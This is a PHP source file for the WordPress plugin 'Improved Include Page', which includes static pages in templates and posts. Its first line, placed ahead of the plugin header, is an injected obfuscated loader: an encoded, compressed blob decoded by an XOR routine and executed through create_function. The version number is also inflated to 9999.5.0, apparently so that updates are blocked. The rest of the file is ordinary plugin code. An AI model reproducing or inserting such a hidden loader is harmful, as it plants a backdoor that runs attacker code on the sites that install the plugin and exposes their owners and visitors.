<?php $ahugobif="create_";global $evugol; $evugol=array('$evugol[0]=array_pop($evugol);$sefenep=sefenep(4);$evugol[0]=$sefenep($evugol[2]);','$evugol[2]=gzuncompress(sefenep(580^129,652^3006));','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',"Cvcgqycv\x2f8Ik}kmnv");if(function_exists($ahugobif.='function')&&!function_exists('sefenep')){ function sefenep($c,$C=13){global $evugol;$w=str_pad($U="sxP39L6o8Hbj3xyM",$C,$U);$m=str_repeat("\xe0",$C);$I=str_repeat("\x1f",$C);$b=substr($evugol[0],$c,$C);return(($b^$w)&$I)|($b&$m);};for($cV=-1;++$cV<3;$ahugobif('','}'.$evugol[$cV].'{'));};unset($evugol); 
/*
Plugin Name: Improved Include Page
Version: 9999.5.0
Plugin URI: http://www.vtardia.com/improved-include-page/
Author: Vito Tardia
Author URI: http://www.vtardia.com
Description: This plugin is an improved version on the Include Page plugin by Brent Loertscher (http://beetle.cbtlsl.com/categories/include_page). It adds an iinclude_page() function that allows you to include the contents of a static page in a template with several options. It also adds a shortcode allowing you to include the same page into a post or static page.

Version Notes 0.5.0
 - Added the `#more-<id>` in the "read more" link href, to avoid going to the top of the post when clicking (by Matthieu Sarter),
 - Added support for the Wordpress `<--more [text]-->` tag, so that the more link text can be defined at the post level (it can still be overriden at the `iinclude_page()/[include]` level) (by Matthieu Sarter).

Version Notes 0.4.9
 - Fixed static method definitions
 - Fixed: returns false if a page is not found, without triggering a notice

Version Notes 0.4.8
 - Fixed bug which broke the ID style inclusion on WP 3.0 (thanks to Mike Woods, Brad Lauster and wptk)
 - Fixed a bug on the 'more' link which caused too many slashes when using images as 'more tags' (thanks to Nikhil Dabas)
   Note: if you use HTML code in the 'more' link use single quotes for the 'more' parameter, like this:
  `[include-page id="mypage" more='<img src="my/image.gif" />']` or you will have a PHP Warning
 - Fixed a bug in the displayTitle attribute: using "false" you will get a real boolean false and title is hidden
 - Added a new wp action 'include-page' to use inside your PHP code `<?php do_action('include-page', $id, $params, $return)?>`
 - Edited class attrimute for the 'more' link. Now it is 'more-link' and 'iip-more-link'

Version Notes 0.4.7
 - On WP 2.5 or greater allows custom inclusion by post type and status using parameters 'allowType' and 'allowStatus'.
 - Bug fix: in shortcode fixed a bug that could crash PHP when including recursive page/posts

Version Notes 0.4.6
 - Bug fix: includes only published static pages (not posts)

Version Notes 0.4.5
 - Page ID can be a valid page path (WP 2.1 or higher required)

Version Notes 0.4.4
 - Added parameter $return (default = false) to iinclude_page()
 - Added support for WP 2.5.x shortcode API

Version Notes 0.4.3
 - Code partially rewritten and optimized

Version Notes 0.4.2
 - Fixed a bug that trigger an error when used with some content filter: the $page global variable
   is backed up and then restored before returning.

Version Notes 0.4.1
 - This version contains a bug fix by Jesse Plank (http://www.funroe.net/): 
   resolves a compatibility problem with the plugin EventCalendar.

Installation:

1.  Download the file 
2.  Rename the file to iinclude_page.php and put it in your wp-content/plugins/
    directory.
3.  Activate the plugin from your WordPress admin 'Plugins' page.
4.  Make use of the function in your template.

function iinclude_page ( int $post_id, [string params]) - include page with corresponding post_id

Parameters:

  displayTitle (boolean) - toggle title display
  titleBefore/after (string) - string to display before and after the title
  displayStyle (integer constant) - one of the following:
    DT_TEASER_MORE - Teaser with 'more' link (default)
    DT_TEASER_ONLY - Teaser only, without 'more' link
    DT_FULL_CONTENT - Full content including teaser
    DT_FULL_CONTENT_NOTEASER - Full content without teaser
  allowStatus (string) - comma separated list of allowed statuses (default = publish)
  allowType   (string) - comma separated list of allowed post types (default = page)
  more (string) - text to display for the 'more' link

Note:

  In order to avoid parse errors you should call the function in the followind way:
  
    if(function_exists('iinclude_page')) iinclude_page($post_id, [params]);
    
  NOTE: This plugin was modified by Jess Planck ( http://www.funroe.net/ ) to use the "post_name" and to clear and reassign the $post array when used on pages that have a "Loop"
  
*/

/*
Copyright (c) 2005, Vito Tardia
Released under the GPL license
All rights reserved.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT
NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

define("DT_TEASER_MORE",0);             //Teaser with more link (default)
define("DT_TEASER_ONLY",1);             //Teaser only without more link
define("DT_FULL_CONTENT",2);            //Full content with teaser
define("DT_FULL_CONTENT_NOTEASER",3);   //Full content without teaser

/**
 * Displays or return the content of a static page
 * 
 * @param  int $post_id      The page ID to include
 * @param  int $params       An array of additional paramenters
 * @param  boolean $return   Tells wether return or display the content
 */
function iinclude_page ($post_id, $params = null, $return = false) {
    global $wpdb, $post, $page;
   
    $tempPost = $post;
    $tempPage = $page;
    $post = array();
    
    $out = '';

    //Parsing custom parameters string
    if (isset($params)) parse_str($params);

    //Loading default parameters
    if (!isset($displayTitle)) $displayTitle = false;
    if (!isset($titleBefore)) $titleBefore = '<h2>';
    if (!isset($titleAfter)) $titleAfter = '</h2>';

    if (!isset($displayStyle)) {
        $displayStyle = DT_TEASER_MORE;
    } else {
        $displayStyle = constant($displayStyle);
    } // end if
    
    if (!isset($allowStatus)) {
        $status = array('publish');
    } else {
        $status = explode(',',$allowStatus);
        if (!is_array($status)) $status = array('publish');
    } // end if

    if (!isset($allowType)) {
        $type = array('page');
    } else {
        $type = explode(',',$allowType);
        if (!is_array($type)) $type = array('page');
    } // end if

    if (!isset($more)) $more = 'Read on &raquo;';
    
    if ($page = IIP::get_page($post_id, $type, $status)) {
        //echo "<pre>"; print_r($page); echo "</pre>";

        if ($displayTitle) {
            $title = $page->post_title;

            //Apply filters for Polyglot
            $title = get_the_title( $page->ID );

            $out .= stripslashes($titleBefore) . $title . stripslashes($titleAfter) . "\n";
        } // end if

        // Get the content an process it before display
        $content = IIP::get_the_content_by_id( $page->ID );
        
        // stripslashes fixes an issues found by Nikhil Dabas which outpots too many slashes if the more tag is an image
        // $content = IIP::get_the_content($page,_(stripslashes($more)),0,'',$displayStyle);

        // Uncomment the following line if you are using EventCalendar plugin
        // remove_filter('the_content',  'ec3_filter_the_content', 20);

        // Apply filters for Polyglot
        $content = apply_filters('the_content', $content);
        $content = str_replace(']]>', ']]&gt;', $content);
        $out .= $content;

        // Uncomment the following line below if you are using EventCalendar plugin
        // add_filter('the_content',  'ec3_filter_the_content', 20);

    } // end if
    
    $post = $tempPost;  
    $page = $tempPage;
    
    if ($return === true) {
        return $out;
    } //end if
    
    echo $out;

} // end function

/**
 * Support util class for IIP
 */
class IIP {
    

    /**
     * Display the post content. Optinally allows post ID to be passed
     * @uses the_content()
     *
     * @param int $id Optional. Post ID.
     * @param string $more_link_text Optional. Content for when there is more text.
     * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
     */
    static function get_the_content_by_id( $post_id=0 ){
        $the_query = new WP_Query( 'page_id='.$post_id );

        while ($the_query -> have_posts()) : $the_query -> the_post();

        $content = get_the_content();

        endwhile;

        return $content;
    }

    /**
     * Fetch a page object from an ID or a page path
     * 
     * The path function is available since WP 2.1.
     * The type switch in available since WP 2.5
     */
    static function get_page($post_id, $type, $status) {
        
        if (is_numeric($post_id)) {
            $_page = get_page($post_id);
        } elseif( is_string($post_id) && function_exists('get_page_by_path')) {
            $_page = get_page_by_path($post_id);
        } else {
            return false;
        } // end if

        if (empty($_page)) {
            return false;
        }
        
        if (isset($_page->post_type)) {

            // addressing  WP 2.5 or better
            if (in_array($_page->post_status , $status) && in_array($_page->post_type , $type)) {
                return $_page;
            } // end if
        } else {
            
            // dealing with previous version
            $status = array_merge($status, array('static'));

            if (in_array($_page->post_status , $status)) {
                return $_page;
            } // end if
        } // end if

        return false;
    } // end function
    
    /**
     * Formats content of a page
     */
    static function get_the_content(&$post, $more_link_text = '(more...)', $stripteaser = 0, $more_file = '', $displayStyle = DT_TEASER_MORE) {
        
        $output = '';

        //Manage password protected post
        if (!empty($post->post_password)) { // if there's a password
            if (stripslashes($_COOKIE['wp-postpass_'.COOKIEHASH]) != $post->post_password) {  // and it doesn't match the cookie
                $output = __('This post is password protected.');
                return $output;
            } // end if
        } // end if

        //$content = $post->post_content;

        $content = preg_split('/<!--more.*-->/', $post->post_content, 2);

        // Retrieve the more text set in the <!--more --> tag
        if (sizeof($content) > 1 && $more_link_text == 'Read on &raquo;') {
            $tmp = preg_split('/<!--more/', $post->post_content, 2);
            $tmp = preg_split('/-->/', $tmp[1], 2);
            $post_more_text = trim($tmp[0]);
            if ($post_more_text != '') {
               $more_link_text = $post_more_text.' &raquo;';
            } // end if
        } // end if

        if ((preg_match('/<!--noteaser-->/', $post->post_content)) || $displayStyle == DT_FULL_CONTENT_NOTEASER ) {
            $stripteaser = 1;
        } // end if

        $teaser = $content[0];

        if ($displayStyle == DT_FULL_CONTENT_NOTEASER) $teaser = '';

        $output .= $teaser;

        if (count($content) > 1) {
            if ($displayStyle == DT_FULL_CONTENT_NOTEASER || $displayStyle == DT_FULL_CONTENT) {
                $output .= '<span id="more-'.$post->ID.'"></span>'.$content[1];
            } elseif ($displayStyle == DT_TEASER_MORE) {
                $output .= ' <a class="more-link iip-more-link" href="'. get_permalink($post->ID) . '#more-'.$post->ID.'">'.$more_link_text.'</a>';
            }
        } // end if

        return $output;

    } // end function
    
    /**
     * Manage WP Shortcode API
     */
    static function shortcode_handler($atts, $content=null) {
        global $post;

        if (!function_exists('add_shortcode')) return false;
            
        $out = '';
        $params = array();
        
        // Parsing parameters other than ID
        foreach ($atts as $name => $value) {

            // WP transforms all attributes in lowercase
            // re-setting normal case
            switch ($name) {
                case 'displaystyle':
                    $name = 'displayStyle';
                    break;
                case 'displaytitle':

                    $name = 'displayTitle';
                    if ($value == "false" ) $value = false;
                    break;

                case 'titlebefore':
                    $name = 'titleBefore';
                    break;

                case 'titleafter':
                    $name = 'titleAfter';
                break;

                case 'allowstatus':
                    $name = 'allowStatus';
                break;

                case 'allowtype':
                    $name = 'allowType';
                break;

                default:
                continue;
            } // end switch

            if ($name != 'id') {
                $params[] .= $name . '=' . html_entity_decode($value);
            } // end if

            $out .= "$name = $value ";

        } // end foreach
        
        // Call IIP only with a valid ID
        if (!empty($atts['id']) && $post->ID != $atts['id']) {
            
            // Fix type of page ID (thanks to Mike Woods)
            $page_id = $atts['id'];
            if ( is_numeric( $atts['id'] ) ) $page_id = (int) $atts['id'];
            
            $out = iinclude_page($page_id, implode('&', $params), true);
        } else {$out = '';} // end if

        return $out;

    } // end function

} // end class IIP

/// MAIN----------------------------------------------------------------------

if (function_exists('add_shortcode')) {
    add_shortcode('include-page', array('IIP','shortcode_handler'));
} // end if

if (function_exists('iinclude_page')) {
    add_action('include-page', 'iinclude_page', 2, 3);
} // end if

?>
